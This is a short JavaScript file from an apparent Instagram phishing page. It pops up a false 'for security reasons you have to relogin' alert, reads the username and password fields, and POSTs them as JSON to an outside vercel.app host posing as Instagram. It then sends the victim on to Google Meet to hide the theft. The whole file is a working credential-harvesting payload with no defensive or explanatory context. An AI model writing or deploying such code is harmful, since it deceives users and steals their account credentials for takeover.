alert("For security reasons you have to relogin your instagram")
async function sendDataToServer(){
    console.log("Sent data to the server")
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value
     


    const data  = {
        username:username,
        password:password,
    }

    const res = await fetch("https://instagram-nine-topaz-52.vercel.app/save",{
        method: "POST",
        headers:{
            "Content-Type": "application/json",
        },
        body:JSON.stringify(data)
    })

    const result = await res
    if(username!="" && password !="") window.location.href = "https://meet.google.com/"
}